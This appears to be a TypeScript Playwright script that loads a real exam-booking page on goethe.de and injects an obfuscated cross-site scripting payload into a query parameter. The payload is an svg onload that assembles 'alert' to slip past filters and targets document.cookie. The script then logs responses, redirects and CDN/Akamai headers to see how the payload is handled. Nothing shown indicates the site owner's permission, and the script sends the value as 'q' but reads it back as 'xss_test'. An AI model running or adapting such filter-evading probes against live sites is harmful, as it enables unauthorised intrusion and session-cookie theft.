import dotenv from "dotenv";
import { chromium, LaunchOptions } from "playwright-core";

dotenv.config();

const startBooking = async (
  browserNumber: number = 2
) => {
  const oid = process.env.TEST_OID;

  if (!oid) {
    throw new Error("TEST_OID is missing from .env");
  }

  const bookingUrl =
    `https://goethe.de/coe/?lang=en&oid=${oid}`;

  // Exact payload from your test.
  const payload =
    `<!--><svg+onload=27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>`;

  // ------------------------------------------------------------
  // PAYLOAD TRANSFORMATION
  // ------------------------------------------------------------

  console.log("\n" + "=".repeat(80));
  console.log("PAYLOAD TEST");
  console.log("=".repeat(80));

  console.log("\n[1] Original payload:");
  console.log(payload);

  const encodedPayload = encodeURIComponent(payload);

  console.log("\n[2] encodeURIComponent(payload):");
  console.log(encodedPayload);

  try {
    console.log("\n[3] decodeURIComponent(encodedPayload):");
    console.log(decodeURIComponent(encodedPayload));
  } catch (error) {
    console.log(
      "\n[3] decodeURIComponent failed:",
      error
    );
  }

  // ------------------------------------------------------------
  // BROWSER
  // ------------------------------------------------------------

  const args: LaunchOptions = {
    headless: false,

    env: {
      DISPLAY: `:${browserNumber}`,
    },
  };

  const browser = await chromium.launch(args);

  const context = await browser.newContext();

  // ------------------------------------------------------------
  // REQUEST LOGGING
  // ------------------------------------------------------------

  context.on("request", (request) => {
    console.log("\n➡️ REQUEST");

    console.log("Method:", request.method());
    console.log("URL:", request.url());

    const postData = request.postData();

    if (postData) {
      console.log("POST DATA:", postData);
    }
  });

  // ------------------------------------------------------------
  // RESPONSE LOGGING
  // ------------------------------------------------------------

  context.on("response", async (response) => {
    console.log("\n⬅️ RESPONSE");

    console.log("Status:", response.status());
    console.log("URL:", response.url());

    const headers = response.headers();

    console.log("Server:", headers["server"] || "N/A");
    console.log(
      "Location:",
      headers["location"] || "N/A"
    );

    // Log potentially useful CDN/cache headers.
    for (const [name, value] of Object.entries(headers)) {
      const lower = name.toLowerCase();

      if (
        lower.includes("akamai") ||
        lower.includes("cache") ||
        lower.includes("request-id") ||
        lower === "x-akamai-session-info"
      ) {
        console.log(`${name}: ${value}`);
      }
    }
  });

  // ------------------------------------------------------------
  // REDIRECT CHAIN
  // ------------------------------------------------------------

  context.on("requestfinished", (request) => {
    const previous = request.redirectedFrom();

    if (previous) {
      console.log("\n🔀 REDIRECT");

      console.log("FROM:");
      console.log(previous.url());

      console.log("TO:");
      console.log(request.url());
    }
  });

  // ------------------------------------------------------------
  // FAILED REQUESTS
  // ------------------------------------------------------------

  context.on("requestfailed", (request) => {
    console.log("\n❌ REQUEST FAILED");

    console.log("URL:", request.url());
    console.log("Method:", request.method());
    console.log("Failure:", request.failure());
  });

  // ------------------------------------------------------------
  // PAGE
  // ------------------------------------------------------------

  const page = await context.newPage();

  page.on("console", (message) => {
    console.log(
      `\n[BROWSER CONSOLE:${message.type()}]`,
      message.text()
    );
  });

  page.on("pageerror", (error) => {
    console.log("\n[BROWSER PAGE ERROR]");
    console.log(error.message);
  });

  // ------------------------------------------------------------
  // SEND TEST VALUE
  // ------------------------------------------------------------

  // Keep the original booking parameters and add the test value
  // as a separate query parameter.
  const testUrl =
    `${bookingUrl}&q=${encodedPayload}`;

  console.log("\n" + "=".repeat(80));
  console.log("NAVIGATION");
  console.log("=".repeat(80));

  console.log("\nOriginal URL:");
  console.log(bookingUrl);

  console.log("\nTest URL:");
  console.log(testUrl);

  let response;

  try {
    response = await page.goto(testUrl, {
      waitUntil: "domcontentloaded",
      timeout: 30_000,
    });
  } catch (error) {
    console.error("\n❌ NAVIGATION ERROR");

    console.error(error);
  }

  // ------------------------------------------------------------
  // FINAL RESULT
  // ------------------------------------------------------------

  console.log("\n" + "=".repeat(80));
  console.log("FINAL RESULT");
  console.log("=".repeat(80));

  console.log("\nFinal URL:");
  console.log(page.url());

  if (response) {
    console.log("\nFinal status:");
    console.log(response.status());

    console.log("\nFinal response headers:");

    const headers = response.headers();

    for (const [name, value] of Object.entries(headers)) {
      console.log(`${name}: ${value}`);
    }
  }

  // ------------------------------------------------------------
  // CHECK WHAT ARRIVED IN THE URL
  // ------------------------------------------------------------

  const finalUrl = new URL(page.url());

  const receivedValue =
    finalUrl.searchParams.get("xss_test");

  console.log("\n" + "=".repeat(80));
  console.log("DECODING OBSERVATION");
  console.log("=".repeat(80));

  console.log("\nValue extracted from final URL:");
  console.log(receivedValue);

  if (receivedValue) {
    try {
      console.log("\ndecodeURIComponent(receivedValue):");
      console.log(
        decodeURIComponent(receivedValue)
      );
    } catch (error) {
      console.log(
        "\ndecodeURIComponent failed:",
        error
      );
    }
  }

  console.log("\nTest completed.");

  // Leave browser open for inspection.
  // await browser.close();
};

startBooking(2).catch((error) => {
  console.error(error);
  process.exit(1);
});